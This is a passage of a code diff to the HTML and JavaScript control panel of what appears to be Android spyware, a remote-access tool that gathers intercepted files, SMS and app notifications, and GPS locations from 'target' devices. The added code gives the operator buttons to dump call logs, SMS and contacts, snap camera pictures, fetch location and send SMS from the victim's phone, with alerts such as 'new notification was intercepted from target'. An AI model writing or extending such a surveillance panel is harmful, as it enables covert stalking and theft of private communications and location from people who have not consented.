+                            ${isOnline ? 'ONLINE' : timeAgo(d.lastSeen)}
                         </div>
                     </div>
-                `).join('');
-            }
-
-            // Render Files
-            document.getElementById('filesList').innerHTML = localData.files.length ? localData.files.map(f => `
-                <div class="list-item">
-                    <div class="item-meta"><span><i class="fa-regular fa-clock"></i> ${formatTime(f.timestamp)}</span> <span>${f.deviceName || ''}</span></div>
-                    <div class="item-content"><i class="fa-solid fa-download"></i> <a href="${f.url}" target="_blank">${f.originalname}</a></div>
-                </div>
-            `).join('') : `<div class="empty-state"><i class="fa-solid fa-folder-open"></i><p>No captured files yet</p></div>`;
-
-            // Render Notifications
-            document.getElementById('notificationsList').innerHTML = localData.notifications.length ? localData.notifications.map(n => `
-                <div class="list-item">
-                    <div class="item-meta"><span><i class="fa-regular fa-clock"></i> ${formatTime(n.timestamp)}</span> <span>${n.deviceName || ''}</span></div>
-                    <div class="item-content">${n.text.replace(/\\n/g, '<br>')}</div>
-                </div>
-            `).join('') : `<div class="empty-state"><i class="fa-solid fa-bell-slash"></i><p>No notifications intercepted</p></div>`;
-
-            // Render Locations
-            document.getElementById('locationsList').innerHTML = localData.locations.length ? localData.locations.map(l => `
-                <div class="list-item">
-                    <div class="item-meta"><span><i class="fa-regular fa-clock"></i> ${formatTime(l.timestamp)}</span> <span>${l.deviceName || ''}</span></div>
-                    <div class="item-content">
-                        <i class="fa-solid fa-map-location-dot" style="color:var(--primary-color)"></i> 
-                        <a href="https://www.google.com/maps?q=${l.latitude},${l.longitude}" target="_blank">View on Google Maps</a>
+                    <div class="action-row">
+                        <div class="btn-action" onclick="sendCommand('${d.id}', 'ch')"><i class="fa-solid fa-phone-flip"></i> Call logs</div>
+                        <div class="btn-action" onclick="sendCommand('${d.id}', 'as')"><i class="fa-solid fa-comment-dots"></i> SMS Dump</div>
+                        <div class="btn-action" onclick="sendCommand('${d.id}', 'loc')"><i class="fa-solid fa-location-crosshairs"></i> Get GPS</div>
+                        <div class="btn-action" onclick="sendCommand('${d.id}', 'cf')"><i class="fa-solid fa-camera"></i> Snap Pic</div>
+                        <div class="btn-action" onclick="promptSms('${d.id}')"><i class="fa-solid fa-paper-plane"></i> Send SMS</div>
+                        <div class="btn-action" onclick="sendCommand('${d.id}', 'contact')"><i class="fa-solid fa-address-book"></i> Contacts</div>
                     </div>
-                </div>
-            `).join('') : `<div class="empty-state"><i class="fa-solid fa-location-arrow"></i><p>No GPS data captured</p></div>`;
+                </div>`;
+            }).join('');
         }
 
-        async function fetchData(btn = null) {
-            if(btn) {
-                const icon = btn.querySelector('i');
-                icon.classList.add('fa-spin');
-                setTimeout(() => icon.classList.remove('fa-spin'), 1000);
-            }
+        function renderFiles() {
+            const q = document.getElementById('searchFiles').value.toLowerCase();
+            const filtered = localData.files.filter(f => f.originalname.toLowerCase().includes(q) || (f.deviceName||'').toLowerCase().includes(q));
+            const c = document.getElementById('filesContainer');
+            if(!filtered.length) return c.innerHTML = `<div class="empty-state"><i class="fa-solid fa-folder-open"></i><p>No logs available.</p></div>`;
+            c.innerHTML = filtered.map(f => `
+                <div class="list-card">
+                    <div class="data-meta"><span>${f.deviceName||'Unknown'}</span><span>${timeAgo(f.timestamp)}</span></div>
+                    <div class="data-content"><i class="fa-solid fa-paperclip" style="color:var(--primary-color)"></i> <a href="${f.url}" download="${f.originalname}">${f.originalname}</a></div>
+                </div>
+            `).join('');
+        }
 
-            try {
-                const [devRes, filesRes, notifRes, locRes] = await Promise.all([
-                    fetch('/admin/devices').catch(()=>null), 
-                    fetch('/admin/files').catch(()=>null), 
-                    fetch('/admin/notifications').catch(()=>null), 
-                    fetch('/admin/locations').catch(()=>null)
-                ]);
-
-                if(devRes) localData.devices = await devRes.json();
+        function renderAlerts() {
+            const q = document.getElementById('searchAlerts').value.toLowerCase();
+            if(activeAlertTab === 'notifications') {
+                const c = document.getElementById('notificationsContainer');
+                const filtered = localData.notifications.filter(n => {
+                    const text = (n.text || '').toLowerCase();
+                    const matchQ = text.includes(q) || (n.deviceName||'').toLowerCase().includes(q);
+                    let matchApp = true;
+                    if(currentAppFilter !== 'all') {
+                        if(currentAppFilter === 'sms') {
+                             matchApp = !text.includes('whatsapp') && !text.includes('instagram') && !text.includes('telegram') && !text.includes('facebook');
+                        } else {
+                             matchApp = text.includes(currentAppFilter);
+                        }
+                    }
+                    return matchQ && matchApp;
+                });
                 
-                if(filesRes) {
-                    const newFiles = await filesRes.json();
-                    if (newFiles.length > localData.files.length) {
-                        triggerAndroidNotification("New File Downloaded", "A new intercepted file is ready to view.");
-                    }
-                    localData.files = newFiles;
-                }
-
-                if(notifRes) {
-                    const newNotifications = await notifRes.json();
-                    if (newNotifications.length > localData.notifications.length) {
-                        triggerAndroidNotification("New Alert", "A new notification was intercepted from target!");
-                    }
-                    localData.notifications = newNotifications;
-                }
-
-                if(locRes) {
-                    const newLocations = await locRes.json();
-                    if (newLocations.length > localData.locations.length) {
-                        triggerAndroidNotification("Location Update", "A GPS coordinate was successfully retrieved.");
-                    }
-                    localData.locations = newLocations;
-                }
-
-                // Save to local storage for offline memory
-                localStorage.setItem('nexus_devices', JSON.stringify(localData.devices));
-                localStorage.setItem('nexus_files', JSON.stringify(localData.files));
-                localStorage.setItem('nexus_notifications', JSON.stringify(localData.notifications));
-                localStorage.setItem('nexus_locations', JSON.stringify(localData.locations));
-
-                // Re-render UI
-                renderData();
-
-            } catch (e) {
-                console.error("Fetch Error:", e);
-            }
-        }
-
-        function triggerAndroidNotification(title, msg) {
-            if (window.Android && typeof window.Android.showNotification === 'function') {
-                window.Android.showNotification(title, msg);
+                if(!filtered.length) return c.innerHTML = `<div class="empty-state"><i class="fa-solid fa-bell-slash"></i><p>No SMS/Notification intel match criteria.</p></div>`;
+                c.innerHTML = filtered.map(n => `
+                    <div class="list-card">
+                        <div class="data-meta"><span><i class="fa-solid fa-mobile-button"></i> ${n.deviceName||'Unknown'}</span><span>${timeAgo(n.timestamp)}</span></div>
+                        <div class="data-content">${n.text.replace(/\\n/g, '<br>')}</div>
+                    </div>`).join('');
             } else {
-                // Not in android wrapper, browser alternative
-                showToast(title + ": " + msg);
+                const c = document.getElementById('locationsContainer');
+                const filtered = localData.locations.filter(l => (l.deviceName||'').toLowerCase().includes(q));
+                if(!filtered.length) return c.innerHTML = `<div class="empty-state"><i class="fa-solid fa-location-arrow"></i><p>No tracking intel.</p></div>`;
+                c.innerHTML = filtered.map(l => `
+                    <div class="list-card">
+                        <div class="data-meta"><span><i class="fa-solid fa-mobile-button"></i> ${l.deviceName||'Unknown'}</span><span>${timeAgo(l.timestamp)}</span></div>
+                        <div class="data-content"><i class="fa-solid fa-map-pin" style="color:var(--danger)"></i> <a href="https://www.google.com/maps?q=${l.latitude},${l.longitude}" target="_blank">View Map: ${l.latitude.toFixed(4)}, ${l.longitude.toFixed(4)}</a></div>
+                    </div>`).join('');
             }
         }
 
-        function switchTab(tabId, el) {
-            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
-            document.querySelectorAll('.tab-content').forEach(c => c.classList.add('hidden'));
-            
-            el.classList.add('active');
-            document.getElementById(tabId + 'List').classList.remove('hidden');
+        async function forceRefresh() {
+            document.getElementById('refreshIcon').classList.add('fa-spin');
+            await fetchData();
+            document.getElementById('refreshIcon').classList.remove('fa-spin');
+            showToast('Server sync complete');
         }
 
-        // Initialize from local storage instantly
-        renderData();
-        // Fetch new data
+        async function fetchData() {
+            document.getElementById('syncStatus').innerHTML = '<i class="fa-solid fa-rotate fa-spin"></i> Syncing';
+            try {
+                const [d, f, n, l] = await Promise.all([
+                    fetch('/admin/devices').catch(()=>null), fetch('/admin/files').catch(()=>null), 
+                    fetch('/admin/notifications').catch(()=>null), fetch('/admin/locations').catch(()=>null)
+                ]);
+                if(d) localData.devices = await d.json();
+                if(f) { const nf = await f.json(); if(nf.length > localData.files.length) triggerNative("New Log", "Intercepted a new file."); localData.files = nf; }
+                if(n) { const nn = await n.json(); if(nn.length > localData.notifications.length) triggerNative("Intel Auto-Intercept", "New SMS/App alert caught!"); localData.notifications = nn; }
+                if(l) { const nl = await l.json(); if(nl.length > localData.locations.length) triggerNative("GPS Tracking", "Device location updated."); localData.locations = nl; }
+                
+                ['devices','files','notifications','locations'].forEach(k => localStorage.setItem('nexus_'+k, JSON.stringify(localData[k])));
+                renderAll();
+                document.getElementById('syncStatus').innerHTML = '<span style="color:var(--success)">●</span> Live';
+            } catch(e) {
+                document.getElementById('syncStatus').innerHTML = '<span style="color:var(--danger)">●</span> Error';
+            }
+        }
+
+        renderAll();
         fetchData();
-        
-        // Auto refresh
-        setInterval(() => fetchData(), 7000); 
+        setInterval(fetchData, 8000);
     </script>
 </body>
 </html>
